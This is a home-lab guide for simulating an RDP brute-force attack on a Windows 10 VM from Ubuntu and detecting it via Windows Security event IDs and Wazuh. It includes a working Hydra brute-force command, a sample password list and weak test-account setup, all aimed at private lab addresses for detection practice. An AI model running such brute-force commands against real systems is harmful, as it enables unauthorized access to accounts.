**Setup Guide – RDP Brute Force Lab (Ubuntu → Windows 10)**

*Overview*

This guide describes how to set up a home lab to simulate and detect a brute-force attack against a Windows 10 machine using RDP. The attack is performed from an Ubuntu machine using Hydra.\
\
\
\
**Lab Requirements**\
\
*Virtual Machines*\
\
Attacker Machine\
\
-OS: Ubuntu 20.04+\
-Tools: Hydra\
\
Victim Machine\
\
-OS: Windows 10
-RDP enabled\
\
\
**Network Configuration**\
\
Both machines must be on the same network\
Example:\
\
-Ubuntu: 192.168.56.103\
-Windows: 192.168.56.104\
\
Test connectivity:

```bash
ping 192.168.56.104
```
\
\
**Step 1 – Configure Windows 10 (Victim)**

*1. Enable Remote Desktop*
\
 Go to:

  * Settings -> System -> Remote Desktop\
\
Enable **Remote Desktop**

\
**Step 1.1 - Create Test User**

Open PowerShell as Administrator:

```powershell
net user testuser Password123 /add
```

\
**Step 1.2 - Grant RDP Access**

```powershell
net localgroup "Remote Desktop Users" testuser /add
```

\
**Step 1.3 - Verify RDP Port (3389)**

Ensure firewall allows RDP:

* Windows Defender Firewall -> Allow app -> Remote Desktop


\
**Step - 1.4. Get IP Address**

```powershell
ipconfig
```

\
**Step 2 – Configure Ubuntu (Attacker)**\
\
\
**Step 2.1 - Update System**

```bash
sudo apt update && sudo apt upgrade -y
```

\
**Step 2.2 - Install Hydra**

```bash
sudo apt install hydra -y
```

\
**Step 2.3 - Create Password List**

Create a file:

```bash
nano passwords.txt
```

Example content:

```text
123456
password
admin
Password123
test123
admin123
```

\
**Step 3 – Execute Brute Force Attack**\
\
\
*Command to generate BFA*

```bash
hydra -V -l testuser -P passwords.txt rdp://192.168.56.104
```


**Step 4 – Analyze Logs in Windows**

*Open Event Viewer*

* Windows Logs -> Security

\
**Key Event IDs**

* **4625** -> Failed login attempt
* **4624** -> Successful login

\
**What to Look For**

* Multiple failed login attempts
* Same source IP
* Logon Type **10** (RDP)

\
**Step 5 – (Optional) SIEM Integration**

In this case i use Wazuh SIEM:

* Install agent on Windows machine
* Forward security logs
* Create detection rule (Next lab):

  * 5+ failed logins within short timeframe

\
**Troubleshooting**\
\
*Hydra cannot connect*

* Check if RDP is enabled
* Verify IP address
* Ensure port 3389 is open

\
*No logs appearing*

* Check Event Viewer filtering
* Ensure audit policies are enabled:

  * Audit Logon Events

\
**Account locked**

* Windows may block after multiple attempts
* Reset or adjust policy

\
**Security Notes**

* This lab must only be performed in a controlled environment
* Do not run brute-force attacks against unauthorized systems

\
**Validation Checklist**

* [ ] RDP enabled on Windows
* [ ] Test user created
* [ ] Hydra installed on Ubuntu
* [ ] Attack executed successfully
* [ ] Logs generated (Event ID 4625/4624)

\
**Next Steps**

* Create detection rules in SIEM (Wazuh)
* Write incident report
